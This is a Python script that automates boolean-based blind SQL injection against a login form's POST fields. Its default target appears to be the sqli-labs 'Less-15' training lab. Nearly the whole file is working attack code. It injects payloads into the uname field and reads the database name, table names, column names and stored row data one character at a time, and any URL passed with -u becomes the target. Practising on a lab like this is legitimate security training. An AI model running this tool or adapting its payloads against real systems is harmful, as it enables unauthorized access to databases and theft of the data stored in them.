import requests
from optparse import OptionParser
import threading

#存放变量
DBName = ""
DBTables = []
DBColumns = []
DBData = {}
flag = 'flag'
#设置重连次数以及将连接改为短连接
#防止因为HTTP连接数过多导致的MAX retries exceeded with url问题
requests.adapters.DEFAULT_RETRIES = 5
conn = requests.session()
conn.keep_alive = False

def GetDBName(url):
    #引用全局变量DBName,用来存放数据库名
    global DBName
    print('[*]开始获取数据库名长度')
    #保存数据库名长度的变量
    DBNameLen = 0
    #检查数据库名的长度的payload
    # payload1 = "' and if(length(database())={0},1,0) #"
    for DBNameLen in range(1,99):
        payload = "admin' and if(length(database())="+str(DBNameLen)+",1,0) #"
        data = {
            'uname':payload,
            'passwd':'admin',
            'submit':'Submit',
        }
        res = conn.post(url,data=data)
        if flag in res.content.decode("utf-8"):
            print("[*] 数据库名长度：" + str(DBNameLen))
            break
    print("[*]开始获取数据库名")
    for a in range(1,DBNameLen+1):
        for item in range(33,128):
            payload = "admin' and if(ascii(substr(database(),"+str(a)+",1))="+str(item)+",1,0) #"
            data = {
                'uname':payload,
                'passwd':'admin',
                'submit':'Submit',
            }
            res = conn.post(url,data=data)
            if flag in res.content.decode('utf-8'):
                DBName += chr(item)
                print("[*]"+DBName)
                break

def GetDBTables(url,dbname):
    global DBTables
    DBTableCount = 0
    print("[*] 开始获取{0}数据库表数量:".format(dbname))
    #获取表名数量的payload
    # payload2 = "' and if((select count(*)table_name from information_schema.tables where table_schema='{0}')={1},1,0) #"
    for DBTableCount in range(1,100):
        payload = "admin' and if((select count(*)table_name from information_schema.tables where table_schema='"+dbname+"')="+str(DBTableCount)+",1,0) #"
        data = {
                'uname':payload,
                'passwd':'admin',
                'submit':'Submit',
            }
        res = conn.post(url,data=data)
        if flag in res.content.decode("utf-8"):
            print("[*]{0}数据库中表的数量为:{1}".format(dbname,DBTableCount))
            break
    print("[*] 开始获取{0}数据库中的表名".format(dbname))
    tableLen = 0
    for a in range(0,DBTableCount):
        print("[*] 正在获取第{0}个表名".format(a+1))
        #获取当前表名的长度
        for tableLen in range(1,99):
            payload = "admin' and if((select LENGTH(table_name) from information_schema.tables where table_schema='"+dbname+"' limit "+str(a)+",1)="+str(tableLen)+",1,0) #"
            data = {
                'uname':payload,
                'passwd':'admin',
                'submit':'Submit',
            }
            res = conn.post(url,data=data)
            if flag in res.content.decode("utf-8"):
                break
        #开始获取表名
        #临时存放当前表名的变量
        table = ""
        #b表示当前表名猜的位置
        for b in range(1,tableLen+1):
            for c in range(33,128):
                payload = "admin' and if(ascii(substr((select table_name from information_schema.tables where table_schema = '"+dbname+"' limit "+str(a)+",1),"+str(b)+",1))="+str(c)+",1,0) #"
                data = {
                'uname':payload,
                'passwd':'admin',
                'submit':'Submit',
                }
                res = conn.post(url,data=data)
                if flag in res.content.decode('utf-8'):
                    table += chr(c)
                    print(table)
                    break
        #把获取到的表名加入DBTables
        DBTables.append(table)
        #清空table,用来获取下一个表名
        table = ''

def GetDBColumns(url,dbname,dbtable):
    global DBColumns
    DBColumnCount = 0
    #获取字段数量的payload
    print("[-]开始获取{0}数据表的字段数:".format(dbtable))
    for DBColumnCount in range(0,99):
        payload = "admin' and if((select count(column_name) from information_schema.columns where table_schema='"+dbname+"' and table_name='"+dbtable+"')="+str(DBColumnCount)+",1,0) #"
        data = {
                'uname':payload,
                'passwd':'admin',
                'submit':'Submit',
                }
        res = conn.post(url,data=data)
        if flag in res.content.decode('utf-8'):
            print("[*] {0}数据库中的{1}表的字段个数为{2}个:".format(dbname,dbtable,DBColumnCount))
            break
    #得到字段数量后开始获取字段名
    columns = ''
    for a in range(0,DBColumnCount):
        print("正在获取第{0}个字段的长度和名称:".format(a+1))
        #获取长度
        for columnLen in range(0,99):
            payload = "admin' and if((select LENGTH(column_name) from information_schema.columns where table_schema='"+dbname+"' and table_name='"+dbtable+"' limit "+str(a)+",1)="+str(columnLen)+",1,0) #"
            data = {
                'uname':payload,
                'passwd':'admin',
                'submit':'Submit',
                }
            res = conn.post(url,data=data)
            if flag in res.content.decode('utf-8'):
                break
        #b标志字段中位置
        for b in range(0,columnLen+1):
            for c in range(33,128):
                payload = "admin' and if(ascii(substr((select column_name from information_schema.columns where table_schema='"+dbname+"' and table_name='"+dbtable+"' limit "+str(a)+",1),"+str(b)+",1))="+str(c)+",1,0) #"
                data = {
                'uname':payload,
                'passwd':'admin',
                'submit':'Submit',
                }
                res = conn.post(url,data=data)
                if flag in res.content.decode('utf-8'):
                    columns += chr(c)
                    print(columns)
                    break
        #获取到的字段放入DBColumns
        DBColumns.append(columns)
        columns = ''

# 获取表数据函数
def GetDBData(url, dbtable, dbcolumn):
    global DBData
    # 先获取字段数据数量
    DBDataCount = 0
    print("[-]开始获取{0}表{1}字段的数据数量".format(dbtable, dbcolumn))
    for DBDataCount in range(99):
        payload = "admin' and if ((select count("+dbcolumn+") from "+dbtable+")="+str(DBDataCount)+",1,0) #"
        data = {
            'uname':payload,
            'passwd':'admin',
            'submit':'Submit',
        }
        res = conn.post(url,data=data)
        if flag in res.content.decode("utf-8"):
            print("[-]{0}表{1}字段的数据数量为:{2}".format(dbtable, dbcolumn, DBDataCount))
            break
    for a in range(0, DBDataCount):
        print("[-]正在获取{0}的第{1}个数据".format(dbcolumn, a+1))
        #先获取这个数据的长度
        dataLen = 0
        for dataLen in range(99):
            payload = "admin' and if ((select length("+dbcolumn+") from "+dbtable+" limit "+str(a)+",1)="+str(dataLen)+",1,0) #"
            data = {
                'uname':payload,
                'passwd':'admin',
                'submit':'Submit',
            }
            res = conn.post(url,data=data)
            if flag in res.content.decode("utf-8"):
                print("[-]第{0}个数据长度为:{1}".format(a+1, dataLen))
                break
        #临时存放数据内容变量
        data1 = ""
        #开始获取数据的具体内容
        #b表示当前数据内容猜解的位置
        for b in range(1, dataLen+1):
            for c in range(33, 128):
                payload = "admin' and if (ascii(substr((select "+dbcolumn+" from "+dbtable+" limit "+str(a)+",1),"+str(b)+",1))="+str(c)+",1,0) #"
                data = {
                    'uname':payload,
                    'passwd':'admin',
                    'submit':'Submit',
                }
                res = conn.post(url,data=data)
                if flag in res.content.decode("utf-8"):
                    data1 += chr(c)
                    print(data1)
                    break
        #放到以字段名为键，值为列表的字典中存放
        DBData.setdefault(dbcolumn,[]).append(data1)
        print(DBData)
        #把data清空来，继续获取下一个数据
        data1 = ""

# 盲注主函数
def StartSqli(url):
    GetDBName(url)
    print("[+]当前数据库名:{0}".format(DBName))
    GetDBTables(url,DBName)
    print("[+]数据库{0}的表如下:".format(DBName))
    for item in range(len(DBTables)):
        print("(" + str(item + 1) + ")" + DBTables[item])
    tableIndex = int(input("[*]请输入要查看表的序号:")) - 1
    GetDBColumns(url,DBName,DBTables[tableIndex])
    while True:
        print("[+]数据表{0}的字段如下:".format(DBTables[tableIndex]))
        for item in range(len(DBColumns)):
            print("(" + str(item + 1) + ")" + DBColumns[item])
        columnIndex = int(input("[*]请输入要查看字段的序号(输入0退出):"))-1
        if(columnIndex == -1):
            break
        else:
            GetDBData(url, DBTables[tableIndex], DBColumns[columnIndex])

if __name__ == "__main__":
    try:
        usage = "./BlindBool_post.py -u url"
        parser = OptionParser(usage)
        parser.add_option('-u',type='string',dest='url',default='http://localhost/Less-15',help='设置目标url')
        options,args=parser.parse_args()
        url = options.url
        # StartSqli(options.url)
        threadSQL = threading.Thread(target=StartSqli,args=(url,))
        threadSQL.start()
    except KeyboardInterrupt:
        print('Interrupted by keyboard inputting!!!')

